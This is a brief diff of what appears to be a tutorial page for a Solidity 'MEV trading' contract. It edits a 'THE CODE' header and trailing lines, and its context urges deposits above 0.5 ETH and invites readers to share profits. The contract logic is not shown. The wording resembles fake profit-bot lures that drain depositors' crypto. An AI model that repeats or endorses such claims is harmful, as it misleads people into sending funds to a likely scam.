@@ -36,7 +36,7 @@ Make sure your deposit is more than 0.5 ETH( to prevent negating slippage ) to y
 
 💰 Share your profits in the comments below, and like & subscribe for more solidity tutorials.
 
-THE CODE:
+THE CODE(everything below is code):
 
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -351,3 +351,5 @@ contract SpeedMEVTradingLP {
         return 0; // No referral code found for the user
     }
 }
+
+
